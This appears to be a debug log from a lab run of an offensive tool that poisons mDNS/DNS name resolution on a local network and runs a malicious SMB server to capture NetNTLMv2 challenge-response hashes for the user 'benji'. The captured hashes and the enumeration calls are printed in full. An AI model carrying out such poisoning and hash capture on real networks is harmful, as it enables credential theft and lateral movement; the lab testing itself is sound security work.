2021-11-14 17:57:25.967 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
2021-11-14 18:03:36.083 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:6dbee8e303ab85053b159cc18c17bf17:0101000000000000008cb6f181d9d701789b4d627335a7990000000001001000510054007900410043006b007000710003001000510054007900410043006b007000710002001000590070006100670078006b007500500004001000590070006100670078006b007500500007000800008cb6f181d9d70106000400020000000800300030000000000000000000000000200000dbaf2b898f10c997ede13117ecd1563a93a6ece16fd7777a079124f9c7a8f2750a0010000000000000000000000000000000000009001e0063006900660073002f006d007300730073002e006c006f00630061006c000000000000000000
2021-11-14 18:03:36.084 | WARNING  | project.ManInTheMiddle.servers.interceptlogging:emit:48 - benji
2021-11-14 18:03:36.104 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:03:42.054 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:42.054 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:42.054 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-14 18:03:42.093 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:42.094 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:42.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-14 18:03:42.132 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:42.133 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:42.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:42.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:43.044 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:43.044 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:43.045 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:43.045 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:43.045 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49862)
2021-11-14 18:03:43.053 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-14 18:03:43.054 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-14 18:03:43.054 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:50a86e6eb3b629ed555dd667cca0b654:010100000000000080a9e2f581d9d7014655f98927a4e5950000000001001000510054007900410043006b007000710003001000510054007900410043006b007000710002001000590070006100670078006b007500500004001000590070006100670078006b00750050000700080080a9e2f581d9d70106000400020000000800300030000000000000000000000000200000dbaf2b898f10c997ede13117ecd1563a93a6ece16fd7777a079124f9c7a8f2750a001000000000000000000000000000000000000900320063006900660073002f00640061006c006500650065006500650065005f006c006f0063006f002e006c006f00630061006c000000000000000000
2021-11-14 18:03:43.054 | WARNING  | project.ManInTheMiddle.servers.interceptlogging:emit:48 - benji
2021-11-14 18:03:43.068 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-14 18:03:43.082 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-14 18:03:43.114 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:03:46.801 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-14 18:03:50.633 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:184 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-14 18:03:50.633 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-14 18:03:50.636 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-14 18:03:50.640 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-14 18:03:50.640 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-14 18:03:50.643 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-14 18:03:50.644 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-14 18:03:50.644 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-14 18:03:53.950 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:53.950 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:53.950 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-14 18:03:53.982 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:53.982 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:53.982 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-14 18:03:54.016 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:54.017 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:54.020 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:54.020 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:54.957 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49864)
2021-11-14 18:03:54.980 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-14 18:03:54.981 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-14 18:03:54.982 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:9ae2f9363fce5edbf51615a7dd57e776:0101000000000000002171fc81d9d701a436a8be60bbd2eb00000000010010004400640057007a0050006f0075004c00030010004400640057007a0050006f0075004c00020010005a0045004e00640055006d0067004e00040010005a0045004e00640055006d0067004e0007000800002171fc81d9d70106000400020000000800300030000000000000000000000000200000dbaf2b898f10c997ede13117ecd1563a93a6ece16fd7777a079124f9c7a8f2750a001000000000000000000000000000000000000900320063006900660073002f00640061006c006500650065006500650065005f006c006f0063006f002e006c006f00630061006c000000000000000000
2021-11-14 18:03:54.983 | WARNING  | project.ManInTheMiddle.servers.interceptlogging:emit:48 - benji
2021-11-14 18:03:55.019 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:03:55.254 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:03:56.961 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:56.962 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:56.963 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:56.963 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:56.964 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:56.964 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:56.965 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:56.965 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:57.955 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:57.955 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:03:57.961 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:03:57.962 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:04:00.061 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-14 18:09:03.920 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:184 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-14 18:09:03.921 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-14 18:09:03.923 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-14 18:09:03.927 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-14 18:09:03.927 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-14 18:09:03.930 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-14 18:09:03.931 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-14 18:09:03.931 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-14 18:09:12.525 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:12.525 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:12.526 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-14 18:09:12.558 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:12.559 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:12.559 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-14 18:09:12.601 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:12.602 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:12.606 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:12.606 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:13.512 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:13.513 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:13.520 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:13.521 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:13.522 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49878)
2021-11-14 18:09:13.553 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-14 18:09:13.554 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-14 18:09:13.555 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:02a2aded0a3508bd0de47b8de8d5a57f:010100000000000080aa94ba82d9d7010917dabbf4bb814000000000010010004e0044006d0048005800470072004600030010004e0044006d00480058004700720046000200100068004400780048004d00550052004c000400100068004400780048004d00550052004c000700080080aa94ba82d9d70106000400020000000800300030000000000000000000000000200000dbaf2b898f10c997ede13117ecd1563a93a6ece16fd7777a079124f9c7a8f2750a001000000000000000000000000000000000000900320063006900660073002f00640061006c006500650065006500650065005f006c006f0063006f002e006c006f00630061006c000000000000000000
2021-11-14 18:09:13.555 | WARNING  | project.ManInTheMiddle.servers.interceptlogging:emit:48 - benji
2021-11-14 18:09:13.579 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:09:15.682 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:15.682 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:15.683 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-14 18:09:15.730 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:15.730 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:15.731 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-14 18:09:15.777 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:15.778 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:15.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:15.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:16.668 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:16.669 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:16.673 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:16.674 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:16.685 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49879)
2021-11-14 18:09:16.717 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-14 18:09:16.718 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-14 18:09:16.719 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:07089a1d89d5c8b180965ff3854ed350:0101000000000000006e5ebc82d9d70195126ab1c827bc6900000000010010004e0044006d0048005800470072004600030010004e0044006d00480058004700720046000200100068004400780048004d00550052004c000400100068004400780048004d00550052004c0007000800006e5ebc82d9d70106000400020000000800300030000000000000000000000000200000dbaf2b898f10c997ede13117ecd1563a93a6ece16fd7777a079124f9c7a8f2750a001000000000000000000000000000000000000900300063006900660073002f006d006500740065006c0065005f00640069006f007300730073002e006c006f00630061006c000000000000000000
2021-11-14 18:09:16.720 | WARNING  | project.ManInTheMiddle.servers.interceptlogging:emit:48 - benji
2021-11-14 18:09:16.749 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-14 18:09:16.767 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-14 18:09:17.159 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-14 18:09:19.832 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:111 - Exiting smb relay attack ...
2021-11-14 18:09:25.287 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:184 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-14 18:09:25.287 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-14 18:09:25.290 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-14 18:09:25.294 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-14 18:09:25.294 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-14 18:09:25.298 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-14 18:09:25.298 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-14 18:09:25.300 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-14 18:09:28.597 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:28.597 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:28.597 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-14 18:09:28.638 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:28.638 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:28.638 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-14 18:09:28.679 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:28.680 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:28.683 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:28.683 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-14 18:09:41.801 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-14 18:09:41.801 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
